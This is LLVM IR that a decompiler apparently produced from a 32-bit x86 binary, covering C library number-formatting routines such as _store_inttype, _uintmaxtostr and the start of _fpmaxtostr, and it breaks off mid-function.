dec_label_pc_8052387:                             ; preds = %dec_label_pc_8052378
  %v6_8052387 = icmp eq i32 %tmp4, 512
  %v1_805238d = icmp eq i1 %v6_8052387, false
  br i1 %v1_805238d, label %dec_label_pc_8052392, label %dec_label_pc_805238f

dec_label_pc_805238f:                             ; preds = %dec_label_pc_8052387
  %v1_805238f = urem i32 %v2_805237e, 65536
  br label %dec_label_pc_8052392

dec_label_pc_8052392:                             ; preds = %dec_label_pc_8052387, %dec_label_pc_8052382, %dec_label_pc_805238f
  %v0_8052394 = phi i32 [ %v2_805237e, %dec_label_pc_8052387 ], [ %v1_8052382, %dec_label_pc_8052382 ], [ %v1_805238f, %dec_label_pc_805238f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8052394

dec_label_pc_8052395:                             ; preds = %entry
  br i1 %v4_8052395, label %dec_label_pc_80523a0, label %dec_label_pc_805239a

dec_label_pc_805239a:                             ; preds = %dec_label_pc_8052395, %dec_label_pc_8052373
  %v1_805239a = add i32 %tmp, 4
  %v2_805239a = inttoptr i32 %v1_805239a to i32*
  %v3_805239a = load i32, i32* %v2_805239a, align 4
  store i32 %v3_805239a, i32* @edx, align 4
  %v1_805239d = inttoptr i32 %tmp to i32*
  %v2_805239d = load i32, i32* %v1_805239d, align 4
  ret i32 %v2_805239d

dec_label_pc_80523a0:                             ; preds = %dec_label_pc_8052395
  %v6_80523a0 = icmp eq i32 %tmp4, 256
  %v1_80523a6 = inttoptr i32 %tmp to i32*
  %v2_80523a6 = load i32, i32* %v1_80523a6, align 4
  %v1_80523a8 = icmp eq i1 %v6_80523a0, false
  br i1 %v1_80523a8, label %dec_label_pc_80523af, label %dec_label_pc_80523aa

dec_label_pc_80523aa:                             ; preds = %dec_label_pc_80523a0
  %v1_80523aa = mul i32 %v2_80523a6, 16777216
  %v2_80523aa = sdiv i32 %v1_80523aa, 16777216
  br label %dec_label_pc_80523b8

dec_label_pc_80523af:                             ; preds = %dec_label_pc_80523a0
  %v6_80523af = icmp eq i32 %tmp4, 512
  %v1_80523b5 = icmp eq i1 %v6_80523af, false
  br i1 %v1_80523b5, label %dec_label_pc_80523b8, label %dec_label_pc_80523b7

dec_label_pc_80523b7:                             ; preds = %dec_label_pc_80523af
  %v1_80523b7 = mul i32 %v2_80523a6, 65536
  %v2_80523b7 = sdiv i32 %v1_80523b7, 65536
  br label %dec_label_pc_80523b8

dec_label_pc_80523b8:                             ; preds = %dec_label_pc_80523af, %dec_label_pc_80523aa, %dec_label_pc_80523b7
  %v0_80523b8 = phi i32 [ %v2_80523a6, %dec_label_pc_80523af ], [ %v2_80523aa, %dec_label_pc_80523aa ], [ %v2_80523b7, %dec_label_pc_80523b7 ]
  %v1_80523b8 = ashr i32 %v0_80523b8, 31
  store i32 %v1_80523b8, i32* @edx, align 4
  ret i32 %v0_80523b8

; uselistorder directives
  uselistorder i32 %v0_80523b8, { 1, 0 }
  uselistorder i32 %v2_80523a6, { 2, 0, 1 }
  uselistorder i32 %v2_805237e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80523b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052392, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80523bc = load i32, i32* @ebx, align 4
  store i32 %v0_80523bc, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_80523c1 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_80523c1, i32* %ebx.global-to-local, align 4
  %v4_80523c5 = trunc i32 %tmp4 to i16
  %v6_80523cd = icmp eq i32 %tmp6, 256
  %v1_80523d3 = icmp eq i1 %v6_80523cd, false
  br i1 %v1_80523d3, label %dec_label_pc_80523d9, label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %entry
  %v2_80523d5 = trunc i32 %tmp4 to i8
  %v4_80523d5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80523d5, i8* %v4_80523d5, align 1
  br label %dec_label_pc_80523f7

dec_label_pc_80523d9:                             ; preds = %entry
  %v6_80523d9 = icmp eq i32 %tmp6, 2048
  %v1_80523df = icmp eq i1 %v6_80523d9, false
  br i1 %v1_80523df, label %dec_label_pc_80523e8, label %dec_label_pc_80523e1

dec_label_pc_80523e1:                             ; preds = %dec_label_pc_80523d9
  %sext2 = mul i32 %tmp4, 65536
  %v1_80523e1 = sdiv i32 %sext2, 65536
  %v3_80523e1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80523e1, i32* %v3_80523e1, align 4
  %v0_80523e3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523e3 = add i32 %v1_80523e3, 4
  %v3_80523e3 = inttoptr i32 %v2_80523e3 to i32*
  store i32 %v0_80523e3, i32* %v3_80523e3, align 4
  br label %dec_label_pc_80523f7

dec_label_pc_80523e8:                             ; preds = %dec_label_pc_80523d9
  %v6_80523e8 = icmp eq i32 %tmp6, 512
  %v1_80523ee = icmp eq i1 %v6_80523e8, false
  br i1 %v1_80523ee, label %dec_label_pc_80523f5, label %dec_label_pc_80523f0

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_80523e8
  store i16 %v4_80523c5, i16* %tmp5, align 2
  br label %dec_label_pc_80523f7

dec_label_pc_80523f5:                             ; preds = %dec_label_pc_80523e8
  %sext3 = mul i32 %tmp4, 65536
  %v1_80523f5 = sdiv i32 %sext3, 65536
  %v3_80523f5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80523f5, i32* %v3_80523f5, align 4
  br label %dec_label_pc_80523f7

dec_label_pc_80523f7:                             ; preds = %dec_label_pc_80523f0, %dec_label_pc_80523e1, %dec_label_pc_80523d5, %dec_label_pc_80523f5
  %v2_80523f7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80523f7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80523f8 = sdiv i32 %sext, 65536
  ret i32 %v1_80523f8

; uselistorder directives
  uselistorder label %dec_label_pc_80523f7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8052407 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052407, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8052413 = icmp slt i32 %arg4, 0
  %v1_8052415 = icmp eq i1 %v2_8052413, false
  br i1 %v1_8052415, label %dec_label_pc_8052436, label %dec_label_pc_8052417

dec_label_pc_8052417:                             ; preds = %entry
  %v1_8052417 = sub i32 0, %arg4
  store i32 %v1_8052417, i32* %esi.global-to-local, align 4
  %v2_8052419 = icmp slt i32 %arg3, 0
  %v1_805241b = icmp eq i1 %v2_8052419, false
  br i1 %v1_805241b, label %dec_label_pc_8052436, label %dec_label_pc_805241d

dec_label_pc_805241d:                             ; preds = %dec_label_pc_8052417
  %v1_805241d = sub i32 0, %arg2
  %v5_805241d = icmp ne i32 %arg2, 0
  store i32 %v1_805241d, i32* %ecx.global-to-local, align 4
  %v2_805241f = zext i1 %v5_805241d to i32
  %v3_805241f = add i32 %v2_805241f, %arg3
  %v1_8052422 = sub i32 0, %v3_805241f
  store i32 %v1_8052422, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052436

dec_label_pc_8052436:                             ; preds = %entry, %dec_label_pc_8052417, %dec_label_pc_805241d
  %v0_805243b = phi i32 [ %v1_8052417, %dec_label_pc_805241d ], [ %v1_8052417, %dec_label_pc_8052417 ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_805241d ], [ 0, %dec_label_pc_8052417 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_805243b
  %tmp30 = urem i32 -1, %v0_805243b
  store i8 0, i8* %arg1, align 1
  %v1_8052440 = add i32 %tmp30, 1
  %v1_8052441 = load i32, i32* %esi.global-to-local, align 4
  %v12_8052441 = icmp eq i32 %v1_8052440, %v1_8052441
  %v1_805244b = icmp eq i1 %v12_8052441, false
  br i1 %v1_805244b, label %dec_label_pc_805245a, label %dec_label_pc_805244d

dec_label_pc_805244d:                             ; preds = %dec_label_pc_8052436
  %v1_805244d = add i32 %div, 1
  br label %dec_label_pc_805245a

dec_label_pc_805245a:                             ; preds = %dec_label_pc_8052436, %dec_label_pc_805244d
  %stack_var_-20.0.off0 = phi i32 [ %v1_8052440, %dec_label_pc_8052436 ], [ 0, %dec_label_pc_805244d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8052436 ], [ %v1_805244d, %dec_label_pc_805244d ]
  %v0_805245a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805245a, i32* %ebp.global-to-local, align 4
  %v0_805245c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805245c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052460

dec_label_pc_8052460:                             ; preds = %dec_label_pc_80524ae, %dec_label_pc_805245a
  %v0_8052497 = phi i32 [ %v0_80524b0, %dec_label_pc_80524ae ], [ %v0_805245a, %dec_label_pc_805245a ]
  %v0_8052464 = phi i32 [ %v1_80524b2, %dec_label_pc_80524ae ], [ %v0_805245c, %dec_label_pc_805245a ]
  %v1_8052460 = icmp eq i32 %v0_8052464, 0
  br i1 %v1_8052460, label %dec_label_pc_8052497, label %dec_label_pc_8052464

dec_label_pc_8052464:                             ; preds = %dec_label_pc_8052460
  %v0_8052468 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8052464, %v0_8052468
  %tmp31 = urem i32 %v0_8052464, %v0_8052468
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8052497, %v0_8052468
  %tmp32 = urem i32 %v0_8052497, %v0_8052468
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_805247b = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_805247f = add i32 %tmp32, %v6_805247b
  %v8_8052485 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_805248a = add i32 %div7, %v8_8052485
  store i32 %v2_805248a, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_805247f, %v0_8052468
  %tmp33 = urem i32 %v2_805247f, %v0_8052468
  %v2_8052492 = add i32 %div8, %v2_805248a
  br label %dec_label_pc_805249f

dec_label_pc_8052497:                             ; preds = %dec_label_pc_8052460
  %v0_805249b = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8052497, %v0_805249b
  %tmp34 = urem i32 %v0_8052497, %v0_805249b
  br label %dec_label_pc_805249f

dec_label_pc_805249f:                             ; preds = %dec_label_pc_8052464, %dec_label_pc_8052497
  %v13_80524a5 = phi i32 [ %tmp33, %dec_label_pc_8052464 ], [ %tmp34, %dec_label_pc_8052497 ]
  %storemerge = phi i32 [ %v2_8052492, %dec_label_pc_8052464 ], [ %div10, %dec_label_pc_8052497 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805249f = load i32, i32* %edi.global-to-local, align 4
  %v1_805249f = add i32 %v0_805249f, -1
  store i32 %v1_805249f, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_80524a5, 10
  br i1 %tmp, label %dec_label_pc_80524a5, label %dec_label_pc_80524aa

dec_label_pc_80524a5:                             ; preds = %dec_label_pc_805249f
  %v2_80524a5 = add i32 %v13_80524a5, 48
  %v12_80524a5 = and i32 %v2_80524a5, 255
  %v14_80524a5 = and i32 %v13_80524a5, -256
  %v15_80524a5 = or i32 %v12_80524a5, %v14_80524a5
  br label %dec_label_pc_80524ae

dec_label_pc_80524aa:                             ; preds = %dec_label_pc_805249f
  %v6_80524aa = add i32 %v13_80524a5, %arg5
  %v21_80524aa = and i32 %v6_80524aa, 255
  %v23_80524aa = and i32 %v13_80524a5, -256
  %v24_80524aa = or i32 %v21_80524aa, %v23_80524aa
  br label %dec_label_pc_80524ae

dec_label_pc_80524ae:                             ; preds = %dec_label_pc_80524a5, %dec_label_pc_80524aa
  %storemerge9 = phi i32 [ %v15_80524a5, %dec_label_pc_80524a5 ], [ %v24_80524aa, %dec_label_pc_80524aa ]
  %v1_80524ae = trunc i32 %storemerge9 to i8
  %v3_80524ae = inttoptr i32 %v1_805249f to i8*
  store i8 %v1_80524ae, i8* %v3_80524ae, align 1
  %v0_80524b0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80524b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80524b2 = or i32 %v1_80524b2, %v0_80524b0
  %v3_80524b2 = icmp eq i32 %v2_80524b2, 0
  %v1_80524b4 = icmp eq i1 %v3_80524b2, false
  br i1 %v1_80524b4, label %dec_label_pc_8052460, label %dec_label_pc_80524b6

dec_label_pc_80524b6:                             ; preds = %dec_label_pc_80524ae
  %v4_80524b6 = icmp eq i32 %storemerge11, 0
  br i1 %v4_80524b6, label %dec_label_pc_80524c1, label %dec_label_pc_80524bd

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524b6
  %v0_80524bd = load i32, i32* %edi.global-to-local, align 4
  %v1_80524bd = add i32 %v0_80524bd, -1
  store i32 %v1_80524bd, i32* %edi.global-to-local, align 4
  %v1_80524be = inttoptr i32 %v1_80524bd to i8*
  store i8 45, i8* %v1_80524be, align 1
  br label %dec_label_pc_80524c1

dec_label_pc_80524c1:                             ; preds = %dec_label_pc_80524b6, %dec_label_pc_80524bd
  %v0_80524c4 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_80524c4

; uselistorder directives
  uselistorder i32 %v13_80524a5, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805247f, { 1, 0 }
  uselistorder i32 %v0_8052468, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8052464, { 1, 0, 2 }
  uselistorder i32 %v0_8052497, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8052440, { 1, 0 }
  uselistorder i32 %v0_805243b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80524c1, { 1, 0 }
  uselistorder label %dec_label_pc_80524ae, { 1, 0 }
  uselistorder label %dec_label_pc_805249f, { 1, 0 }
  uselistorder label %dec_label_pc_805245a, { 1, 0 }
  uselistorder label %dec_label_pc_8052436, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80524cd = load i32, i32* @edi, align 4
  %v0_80524ce = load i32, i32* @esi, align 4
  %v0_80524cf = load i32, i32* @ebx, align 4
  store i32 %v0_80524cf, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_80524e4 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80524e4 = add i3 %v4_80524e4, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_80524e4, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80524eb = add i32 %tmp156, 4
  %v2_80524eb = inttoptr i32 %v1_80524eb to i32*
  %v3_80524eb = load i32, i32* %v2_80524eb, align 4
  store i32 %v3_80524eb, i32* %eax.global-to-local, align 4
  %v1_80524f2 = add i32 %tmp156, 8
  %v2_80524f2 = inttoptr i32 %v1_80524f2 to i8*
  %v3_80524f2 = load i8, i8* %v2_80524f2, align 1
  %v4_80524f2 = zext i8 %v3_80524f2 to i32
  %v6_80524f2 = and i32 %v0_80524cf, -256
  %v7_80524f2 = or i32 %v4_80524f2, %v6_80524f2
  store i32 %v7_80524f2, i32* %ebx.global-to-local, align 4
  %v1_80524f5 = inttoptr i32 %tmp156 to i32*
  %v2_80524f5 = load i32, i32* %v1_80524f5, align 4
  store i32 %v2_80524f5, i32* %ebp.global-to-local, align 4
  %v2_8052501 = or i8 %v3_80524f2, 32
  %v7_8052501 = zext i8 %v2_8052501 to i32
  %v9_8052501 = and i32 %v3_80524eb, -256
  %v10_8052501 = or i32 %v7_8052501, %v9_8052501
  store i32 %v10_8052501, i32* %eax.global-to-local, align 4
  %v10_8052503 = icmp eq i8 %v2_8052501, 97
  %v1_8052509 = icmp eq i1 %v10_8052503, false
  br i1 %v1_8052509, label %dec_label_pc_8052512, label %dec_label_pc_805250b

dec_label_pc_805250b:                             ; preds = %entry
  %v2_805250b = add i8 %v3_80524f2, 6
  %v15_805250b = zext i8 %v2_805250b to i32
  %v18_805250b = or i32 %v15_805250b, %v6_80524f2
  store i32 %v18_805250b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052512

dec_label_pc_8052512:                             ; preds = %entry, %dec_label_pc_805250b
  %stack_var_-207.0 = phi i8 [ %v3_80524f2, %entry ], [ %v2_805250b, %dec_label_pc_805250b ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8052519 = icmp slt i32 %v2_80524f5, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8052528 = select i1 %v2_8052519, i32 6, i32 %v2_80524f5
  store i32 %v3_8052528, i32* %ebp.global-to-local, align 4
  %v1_805252b = add i32 %tmp156, 12
  %v2_805252b = inttoptr i32 %v1_805252b to i32*
  %v3_805252b = load i32, i32* %v2_805252b, align 4
  store i32 %v3_805252b, i32* %eax.global-to-local, align 4
  %v2_805252e = and i32 %v3_805252b, 2
  %v3_805252e = icmp eq i32 %v2_805252e, 0
  br i1 %v3_805252e, label %dec_label_pc_805253c, label %dec_label_pc_8052548

dec_label_pc_805253c:                             ; preds = %dec_label_pc_8052512
  %v2_805253c = urem i32 %v3_805252b, 2
  %tmp192 = trunc i32 %v2_805253c to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8052548

dec_label_pc_8052548:                             ; preds = %dec_label_pc_805253c, %dec_label_pc_8052512
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8052512 ], [ %tmp193, %dec_label_pc_805253c ]
  %not.v5_8052548 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8052548, label %dec_label_pc_80525bf, label %dec_label_pc_805256a

dec_label_pc_805256a:                             ; preds = %dec_label_pc_8052548
  %v1_805256a = add i3 %v4_80524e4, -2
  store i3 %v1_805256a, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_805256e = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_805256e, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_805256a
  br label %dec_label_pc_80525fa

bb180:                                            ; preds = %dec_label_pc_805256a
  %v5_805256e = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_805256e, label %bb181, label %dec_label_pc_8052572

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_80525fa

dec_label_pc_8052572:                             ; preds = %bb180
  %not.v4_805256c = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_805256c, label %dec_label_pc_80525fa, label %dec_label_pc_805268f

dec_label_pc_80525bf:                             ; preds = %dec_label_pc_8052548
  store i3 %v4_80524e4, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80525c6 = add i32 %tmp156, 16
  %v2_80525c6 = inttoptr i32 %v1_80525c6 to i32*
  store i32 32, i32* %v2_80525c6, align 4
  %v4_80525cd = add i8 %stack_var_-207.0, -96
  %v6_80525cd = sub i8 95, %stack_var_-207.0
  %v7_80525cd = and i8 %v6_80525cd, %stack_var_-207.0
  %v8_80525cd = icmp slt i8 %v7_80525cd, 0
  %v9_80525cd = icmp eq i8 %v4_80525cd, 0
  %v10_80525cd = icmp slt i8 %v4_80525cd, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_80525e2 = icmp eq i1 %v10_80525cd, %v8_80525cd
  %v4_80525e2 = icmp eq i1 %v9_80525cd, false
  %v5_80525e2 = and i1 %v4_80525e2, %v3_80525e2
  br i1 %v5_80525e2, label %dec_label_pc_80525e9, label %dec_label_pc_80525e4

dec_label_pc_80525e4:                             ; preds = %dec_label_pc_80525bf
  br label %dec_label_pc_80525e9

dec_label_pc_80525e9:                             ; preds = %dec_label_pc_80525bf, %dec_label_pc_80525e4
  %v2_80525f1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80525f1, i32* @ecx, align 4
  br label %dec_label_pc_80529ba

dec_label_pc_80525fa:                             ; preds = %dec_label_pc_8052572, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8052614 = xor i3 %v4_80524e4, -4
  store i3 %v3_8052614, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805261a

dec_label_pc_805261a:                             ; preds = %dec_label_pc_805266b, %dec_label_pc_80525fa
  %v0_805266b = phi i32 [ 4096, %dec_label_pc_80525fa ], [ %v2_805266b, %dec_label_pc_805266b ]
  %v2_805261d = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80525fa ], [ %v2_805261d81, %dec_label_pc_805266b ]
  %v1_8052655 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80525fa ], [ %v0_805261a79, %dec_label_pc_805266b ]
  %v0_805266766 = phi i32 [ 13, %dec_label_pc_80525fa ], [ %v1_805261c, %dec_label_pc_805266b ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_80525fa ], [ %stack_var_-220.1, %dec_label_pc_805266b ]
  %v1_805261c = add i32 %v0_805266766, -1
  %v4_805261d = fcmp ule x86_fp80 %v1_8052655, %v2_805261d
  br i1 %v4_805261d, label %dec_label_pc_8052644, label %dec_label_pc_8052621

dec_label_pc_8052621:                             ; preds = %dec_label_pc_805261a
  store x86_fp80 %v1_8052655, x86_fp80* %st0.global-to-local, align 4
  %v3_8052623 = mul i32 %v1_805261c, 12
  store i32 %v3_8052623, i32* %eax.global-to-local, align 4
  %v1_8052626 = add i32 %v3_8052623, ptrtoint (x86_fp80** @global_var_8057980.227 to i32)
  %v2_8052626 = inttoptr i32 %v1_8052626 to x86_fp80*
  %v3_8052626 = load x86_fp80, x86_fp80* %v2_8052626, align 4
  %v4_805262c = fmul x86_fp80 %v1_8052655, %v3_8052626
  store x86_fp80 %v4_805262c, x86_fp80* %st1.global-to-local, align 4
  %v4_8052630 = fcmp ule x86_fp80 %v4_805262c, %v3_8052626
  br i1 %v4_8052630, label %dec_label_pc_8052665, label %dec_label_pc_8052634

dec_label_pc_8052634:                             ; preds = %dec_label_pc_8052621
  store x86_fp80 %v4_805262c, x86_fp80* %st1.global-to-local, align 4
  %v5_805263e = sub i32 %stack_var_-220.0, %v0_805266b
  br label %dec_label_pc_8052667

dec_label_pc_8052644:                             ; preds = %dec_label_pc_805261a
  %v3_8052644 = mul i32 %v1_805261c, 12
  store i32 %v3_8052644, i32* %eax.global-to-local, align 4
  %v1_8052647 = add i32 %v3_8052644, ptrtoint (x86_fp80** @global_var_8057980.227 to i32)
  %v2_8052647 = inttoptr i32 %v1_8052647 to x86_fp80*
  %v3_8052647 = load x86_fp80, x86_fp80* %v2_8052647, align 4
  %v4_805264d = fdiv x86_fp80 %v3_8052647, %v1_8052655
  store x86_fp80 %v4_805264d, x86_fp80* %st1.global-to-local, align 4
  %v4_805264f = fcmp ogt x86_fp80 %v3_8052647, %v1_8052655
  br i1 %v4_805264f, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8052644
  store x86_fp80 %v3_8052647, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8052655

bb183:                                            ; preds = %dec_label_pc_8052644
  %v5_805264f = fcmp olt x86_fp80 %v3_8052647, %v1_8052655
  br i1 %v5_805264f, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8052647, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8052665

bb184:                                            ; preds = %bb183
  %not.v6_805264f = fcmp une x86_fp80 %v3_8052647, %v1_8052655
  store x86_fp80 %v3_8052647, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_805264f, label %dec_label_pc_8052665, label %dec_label_pc_8052655

dec_label_pc_8052655:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8052647, x86_fp80* %st1.global-to-local, align 4
  %v5_805265f = add i32 %stack_var_-220.0, %v0_805266b
  br label %dec_label_pc_8052667

dec_label_pc_8052665:                             ; preds = %dec_label_pc_8052621, %.thread51, %bb184
  %v1_8052665 = phi x86_fp80 [ %v1_8052655, %.thread51 ], [ %v1_8052655, %bb184 ], [ %v3_8052626, %dec_label_pc_8052621 ]
  %v0_805261a80 = phi x86_fp80 [ %v3_8052647, %.thread51 ], [ %v3_8052647, %bb184 ], [ %v4_805262c, %dec_label_pc_8052621 ]
  store x86_fp80 %v1_8052665, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8052667

dec_label_pc_8052667:                             ; preds = %dec_label_pc_8052655, %dec_label_pc_8052634, %dec_label_pc_8052665
  %v2_805261d81 = phi x86_fp80 [ %v1_8052665, %dec_label_pc_8052665 ], [ %v2_805261d, %dec_label_pc_8052655 ], [ %v1_8052655, %dec_label_pc_8052634 ]
  %v0_805261a79 = phi x86_fp80 [ %v0_805261a80, %dec_label_pc_8052665 ], [ %v3_8052647, %dec_label_pc_8052655 ], [ %v4_805262c, %dec_label_pc_8052634 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8052665 ], [ %v5_805265f, %dec_label_pc_8052655 ], [ %v5_805263e, %dec_label_pc_8052634 ]
  %v1_8052667 = icmp eq i32 %v1_805261c, 0
  br i1 %v1_8052667, label %.thread60, label %dec_label_pc_805266b

dec_label_pc_805266b:                             ; preds = %dec_label_pc_8052667
  %v2_805266b = sdiv i32 %v0_805266b, 2
  store i32 %v2_805266b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805261a

.thread60:                                        ; preds = %dec_label_pc_8052667
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805268f

dec_label_pc_805268f:                             ; preds = %dec_label_pc_8052572, %.thread60
  %v0_8052749 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8052572 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8052572 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8052693 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_805256a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_80526a6 = and i32 %v2_8052693, -65536
  %v1_80526ab = udiv i16 %tmp146, 256
  %v2_80526ab = zext i16 %v1_80526ab to i32
  %v3_80526ab = or i32 %v2_80526ab, 12
  %v10_80526ab = mul nuw nsw i32 %v3_80526ab, 256
  %tmp194 = urem i16 %tmp146, 256
